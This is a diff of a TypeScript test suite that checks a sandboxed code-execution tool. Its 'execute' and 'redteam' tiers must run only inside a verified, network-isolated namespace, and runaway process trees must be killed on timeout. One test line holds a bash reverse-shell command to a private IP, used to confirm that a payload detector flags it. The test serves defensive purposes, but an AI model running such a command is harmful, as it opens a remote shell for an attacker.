@@ -69,18 +69,22 @@ async function main(): Promise<void> {
   const legacyCode = await runTool("run_js", { code: `return this.process ? 'escaped' : 'contained';` }, worktree, { userApproved: true });
   check("review tier no longer executes code", legacyCode.ok === false && /ops:/i.test(legacyCode.error ?? ""), legacyCode.error ?? "");
 
-  // 6. detonation tiers state their refusal plainly. Here the lane is enabled in
-  // config but sbx is not installed: the required property is that we NEVER
-  // silently fall back to running on the host.
+  // 6. detonation tiers execute inside the VERIFIED namespace sandbox — the
+  //    required property is that we NEVER silently fall back to the host.
+  //    (Historically this asserted a plain sbx refusal; the namespace runner
+  //    made real, verified execution possible, so the assertion now tracks the
+  //    isolation verification instead. A disabled lane still refuses plainly.)
   const detEnabled = detonateEnabledIn(worktree);
-  const exec = await runTool("run_js", { code: `return 1;`, tier: "execute" }, worktree, { userApproved: true });
+  const exec = await runTool("run_js", { code: `console.log("ns-exec-ok");`, tier: "execute" }, worktree, { userApproved: true });
   const execMsg = (exec.error ?? "") + (exec.out ?? "");
-  const execRefused = exec.ok === false && (detEnabled ? /sbx/i.test(execMsg) : /disabled/i.test(execMsg));
-  check("execute tier refuses plainly (no host fallback)", execRefused, execMsg.slice(0, 120));
-  const rt = await runTool("run_js", { code: `return 1;`, tier: "redteam" }, worktree, { userApproved: true });
+  const execIsolated = exec.ok === true && /backend=ns-wsl/.test(execMsg) && /netns=verified loopback-only/.test(execMsg) && /hostfs=hidden from guest/.test(execMsg);
+  const execDisabled = exec.ok === false && /disabled/i.test(execMsg);
+  check("execute tier runs in the verified namespace (never host)", detEnabled ? execIsolated : execDisabled, execMsg.slice(0, 140));
+  const rt = await runTool("run_js", { code: `console.log("rt-ok");`, tier: "redteam" }, worktree, { userApproved: true });
   const rtMsg = (rt.error ?? "") + (rt.out ?? "");
-  const rtRefused = rt.ok === false && (detEnabled ? /sbx/i.test(rtMsg) : /disabled/i.test(rtMsg));
-  check("redteam tier refuses plainly (no host fallback)", rtRefused, rtMsg.slice(0, 120));
+  const rtIsolated = rt.ok === true && /backend=ns-wsl/.test(rtMsg) && /netns=verified loopback-only/.test(rtMsg);
+  const rtDisabled = rt.ok === false && /disabled/i.test(rtMsg);
+  check("redteam tier runs in the verified namespace (never host)", detEnabled ? rtIsolated : rtDisabled, rtMsg.slice(0, 140));
 
   // 7. unclean-text heuristic still routes payloads away from the clean path
   check("isUnclean detects reverse shell", isUnclean("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1") === true);
@@ -132,6 +136,43 @@ async function main(): Promise<void> {
     check("ignored-file changes are outside git-quarantine coverage (documented)", qIgnored.changed.every((c) => !c.includes("ignored.txt")), JSON.stringify(qIgnored.changed));
   } finally {
     try { fs.rmSync(repo, { recursive: true, force: true }); } catch { /* temp */ }
+  }
+
+  // 11. execute lane END-TO-END via the namespace runner (WSL2): delivery,
+  // network isolation VERIFIED FROM THE GUEST, host-drive hiding, and tree
+  // termination - the external audit's mandatory items, proven live.
+  // Guest timeout override: args.timeoutMs (clamped 2s..120s in tools.ts).
+  const detWorktree = fs.mkdtempSync(path.join(os.tmpdir(), "ehc-det-e2e-"));
+  try {
+    const git = (args: string[]) => execFileSync("git", args, { cwd: detWorktree, encoding: "utf8" });
+    git(["init", "-q"]); git(["config", "user.email", "t@t"]); git(["config", "user.name", "t"]);
+    fs.writeFileSync(path.join(detWorktree, "keep.txt"), "host worktree\n");
+    git(["add", "."]); git(["commit", "-q", "-m", "init"]);
+    const marker = [
+      `import fs from "node:fs";`,
+      `console.log("GUEST-MARKER");`,
+      `try { console.log("mntc_entries", fs.readdirSync("/mnt/c").length); } catch { console.log("mntc_entries", "hidden"); }`,
+    ].join("\n");
+    const exec1 = await runTool("run_js", { code: marker, tier: "execute", timeoutMs: 20000 }, detWorktree, { userApproved: true, sessionId: "ses_det_e2e" });
+    check("execute lane ok", exec1.ok === true, (exec1.error ?? exec1.out).slice(0, 200));
+    check("guest marker present", /GUEST-MARKER/.test(exec1.out));
+    check("network namespace verified from guest", /netns=verified loopback-only/.test(exec1.out), exec1.out.split("\n")[0] ?? "");
+    check("host drives hidden from guest", /hostfs=hidden from guest/.test(exec1.out), exec1.out.split("\n")[0] ?? "");
+    check("artifact delivered", /delivered=yes/.test(exec1.out), exec1.out.split("\n")[0] ?? "");
+    check("process tree terminated", /tree=terminated/.test(exec1.out), exec1.out.split("\n")[0] ?? "");
+    check("host quarantine clean after execution", !/quarantine/.test(exec1.out) && !/fs snapshot/.test(exec1.out), exec1.out.split("\n")[0] ?? "");
+
+    // process-tree kill: an artifact that never exits + a background grandchild
+    const sleeper = [
+      `import { spawn } from "node:child_process";`,
+      `spawn(process.execPath, ["-e", "setInterval(() => 1, 50)"], { detached: true, stdio: "ignore" }).unref();`,
+      `setInterval(() => 1, 50);`,
+    ].join("\n");
+    const exec2 = await runTool("run_js", { code: sleeper, tier: "execute", timeoutMs: 3000 }, detWorktree, { userApproved: true, sessionId: "ses_det_e2e" });
+    check("timeout kills the run", exec2.ok === false && (exec2.error ?? "").includes("timed out"), (exec2.error ?? "").slice(0, 120));
+    check("process tree terminated on timeout", /tree=terminated/.test(exec2.out), (exec2.out.split("\n")[0] ?? "").slice(0, 160));
+  } finally {
+    try { fs.rmSync(detWorktree, { recursive: true, force: true }); } catch { /* temp */ }
   }
 
   console.log(failures === 0 ? "[ehc] detonate gate tests: ALL PASS" : `[ehc] detonate gate tests: ${failures} FAILURE(S)`);
